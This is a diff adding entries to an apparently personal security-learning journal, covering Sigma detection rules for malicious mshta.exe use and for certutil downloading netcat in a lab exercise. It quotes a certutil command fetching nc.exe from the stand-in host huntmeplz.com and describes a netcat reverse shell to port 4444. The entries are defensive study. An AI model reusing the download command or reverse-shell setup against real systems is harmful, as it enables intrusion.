@@ -321,6 +321,80 @@ AAC - Trying Visualization to Win - My next idea was, "Can I view a timeline bas
 
 AAC - SUMMARY - This room took me several hours with a small break in the middle. It was my first room that I completed without any help from a written or video guide, so in that sense it was a big accomplishment. Although I did use ChatGPT quite a bit, I will say that I used it in a manner that shouldn't take away from my accomplishment too much. I would ask the AI clarifying questions or questions to help steer me. I think the use of AI will continue to be my strength during this learning journey, but I know I rely on it a little too much sometimes. I really had a great opportunity to read through some web traffic logs and understand what the machines were saying to eachother. I feel confident I could succeed in a more efficient manner if presented with a scenario like this again.
 
+AAD - Creating Various Sigma Rules for Use in Automated Threat Detection - For this I am just going to briefly talk about what I learned and then dump in all the rules I came up with to handle each scenario. Sigma is cool, it is written in YAML YAML Aint Markup Language, it's easy to read, and once it is written I can use tools via CLI or online at Ucoder.IO which is my favorite for ease of use. I am addressing many scenarios. The first is mshta.exe which is a concern because it can be used to execute HTML application as part of an attack, which can result in the delivery of malware or conducting system reconnaissance:
+
+title: Detection of Malicious mshta Execution
+id: 183e39c9-12b4-41ae-a907-075d7172d29b
+status: experimental
+description: Detects potential malicious use of mshta.exe based on execution of HTA files from common user directories.
+author: Jason Layton
+date: 2024-02-27
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection1:
+    EventID: 1 # Process creation ID in Sysmon
+    Image: '*mshta.exe*'
+  selection2:
+    CommandLine: 
+      - '*mshta.exe*'
+      - '*update.hta*'
+  selection3:
+    ParentImage: 
+      - '*chrome.exe*'
+      - '*firefox.exe*'
+      - '*msedge.exe*'
+      - '*OUTLOOK.EXE*'
+  condition: selection1 AND (selection2 OR selection3)
+fields:
+  - CommandLine
+  - CurrentDirectory
+  - ParentCommandLine
+  - ParentImage
+  - Hashes
+falsepositives:
+  - Legitimate use of HTA files by users or administrators for non-malicious purposes.
+level: medium
+tags:
+  - attack.execution
+  - attack.t1204
+
+AAD - Certutil File Ingress - My next challenge is to design a rule for detecting the execution of certutil tool to download netcat binary. Once again I am basing these rules off of a detection found in sysmon logs. The fields required to be listed when creating rules are EventID, Image, and CommandLine. This is a policy set by the organization I am working for. Upon further investigation *pushes glasses up, the following command triggered the original detection by sysmon: 
+certutil -urlcache -split -f http://huntmeplz.com/nc.exe C:\Users\victim\AppData\Local\Temp\nc.exe:
+title: Certutil Downloading Netcat Binary
+id: 71f75f27-aefc-4fb6-993b-6c87d3ec83e4
+status: experimental
+description: Detects the use of certutil.exe to download Netcat binaries, which may indicate an attempt to establish a backdoor or command and control channel.
+author: Jason Layton
+date: 2024-02-27
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: '1'
+    Image: 
+      - '*\certutil.exe'
+    CommandLine: 
+      - '* -urlcache -split -f *nc.exe*'
+      - '* -urlcache -split -f *netcat.exe*'
+      - '*ransom.exe*'
+  condition: selection
+fields:
+  - CommandLine
+  - Image
+  - ParentImage
+  - ParentCommandLine
+falsepositives:
+  - Legitimate use of certutil for managing certificates or downloading trusted files.
+level: medium
+tags:
+  - attack.command_and_control
+  - attack.t1105 # Technique for Ingress Tool Transfer
+
+AAD - The Sysmon log provided outlines a scenario indicative of a cybersecurity incident involving the execution of Netcat (nc.exe). The initial vector could have began with a phishing campaign or malicious web content leading to the download of an HTA file as noted previously. Then netcat was used to connect back to a C2 server named 'huntmeplz.com' on port 4444 where cmd.exe was executed remotely. I really got stuck on this one because I was only detecting 1 out of 7 important events. The answer was to basically give the rule an either or option instead of AND. Either the hash value associated with the executable or the command line containing certain flags when running netcat. I am going to stop the journal for this room and focus on finishing.
+
 *******************************************************************************************************************************
 
 BA - Overview of the SOC automation project. Created a Windows 10 based virtual machine instance on virtual box. On the Windows 10 server we installed a Wazuh agent and a Sysmon64 application which are to send Events to a cloud hosted Wazuh manager. That manage will then send alerts based un prebuilt triggers to another cloud hosted server called Shuffle which will maintain a current encyclopedia of indicators of compromise and analyze the events coming across. Then Shuffle will send events to the theHive which will perform Case Management. Ultimately, I will receive emails about positive alerts and then provide responsive action which will make its way back to the Windows 10 Server.
